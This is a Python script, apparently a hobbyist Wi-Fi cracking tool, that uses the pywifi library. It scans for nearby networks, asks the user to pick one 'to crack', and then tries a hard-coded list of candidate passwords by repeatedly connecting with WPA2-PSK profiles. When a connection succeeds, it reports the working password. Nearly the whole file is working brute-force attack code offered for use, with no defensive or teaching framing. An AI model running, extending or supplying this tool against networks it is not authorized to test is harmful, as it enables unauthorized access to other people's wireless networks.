import pywifi
from pywifi import const
import time
import os
from colorama import Fore, init


init(convert=True)
version = '1'
github_url = 'https://github.com/apkaless'
instagram = 'https://instagram.com/apkaless'
region = 'IRAQ'
red = Fore.RED
green = Fore.GREEN
yellow = Fore.YELLOW
white = Fore.WHITE
cyan = Fore.CYAN
lw = Fore.LIGHTWHITE_EX
black = Fore.BLACK
lr = Fore.LIGHTRED_EX
lb = Fore.LIGHTBLUE_EX
lc = Fore.LIGHTCYAN_EX
lib = Fore.LIGHTBLACK_EX
res = Fore.RESET

def scan_for_in_range_wifi():
    os.system('cls')
    wifis = []
    iface.scan()
    for i in range(5):
        print(f'\r{green}[+] Scanning For WI-FI Networks Please Wait For {lb}({str(5 - i)})', end='')
        time.sleep(1)
    for i in iface.scan_results():
        wifis.append((i.ssid, i.signal + 100))
    sorted_wifis = sorted(wifis, key=lambda x: x[1], reverse=True)
    id = 0
    os.system('cls')
    print('{}{:<8s}{:<10s}{}\n-------------------------'.format(green,'ID', 'Signal', 'Name'))
    while id < len(sorted_wifis):
        print('{}{:<10d}{:<8d}{}'.format(white,id + 1, int(sorted_wifis[id][1]), sorted_wifis[id][0]))
        id += 1
    while True:
        wid = input(f'\n\n{green}[+] Select WI-FI By ID:{white} ')
        try:
            wifi_to_crack = sorted_wifis[int(wid) - 1][0]
            confirmation = input(f'\n{yellow}[!]{green} is {white}{wifi_to_crack}{green} The WI-FI You Wanna Crack {lb}(Y/N):{white} ').lower()
            if confirmation == 'y':
                print('\n')
                break
            else:
                continue
        except IndexError:
            continue
    
    return wifi_to_crack


def connect_to_wifi(name, password):
        profile = pywifi.Profile()
        profile.ssid = name
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password
        iface.remove_all_network_profiles()
        temp_profile = iface.add_network_profile(profile)
        iface.connect(temp_profile)
        start_time = time.time()
        while time.time() - start_time < 0.5:
            if iface.status() == 4:
                print(f'\r{green}[+] Connected To {white}{name}{green} Using {white}{password}                  ', end=' ')
                input('\n\n')
                exit(1)
            else:
                print(f'\r{red}[-] Failed To Connect To {white}{name}{red} Using {white}{password}   ', end=' ')

def crack(ssid):
    keys = ['aa112233', 'dwedewfk', '0irf0ewuj', 'eopwkjfp[we', 'root2003', '345636436346']
    iface.disconnect()
    while iface.status() == 4:
        pass

    for pwd in keys:
        connect_to_wifi(ssid, pwd)

def main():
    global pywifi_obj, iface
    pywifi_obj = pywifi.PyWiFi()
    iface = pywifi_obj.interfaces()[0]
    wifi_to_crack = scan_for_in_range_wifi()
    crack(wifi_to_crack)

if __name__ == '__main__':
    main()